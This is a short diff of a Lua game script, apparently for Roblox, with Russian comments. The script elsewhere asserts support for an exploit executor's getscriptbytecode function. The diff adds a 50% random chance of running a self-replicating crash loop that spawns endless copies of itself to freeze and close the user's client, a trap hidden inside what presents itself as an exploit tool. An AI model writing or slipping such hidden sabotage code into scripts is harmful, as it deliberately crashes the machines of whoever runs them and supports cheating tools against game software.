@@ -1,9 +1,14 @@
-local function crash()
-    while true do
-        task.spawn(crash) -- Бесконечно плодит копии самой себя
+local chance = math.random(0, 1)
+
+if chance == 1 then
+    -- 50% Шанс: Тяжелый рекурсивный цикл для закрытия клиента
+    local function crash()
+        while true do
+            task.spawn(crash)
+        end
     end
-end
-crash()
+    crash()
+else
 
 assert(getscriptbytecode, "exploit does not support getscriptbytecode.")
 
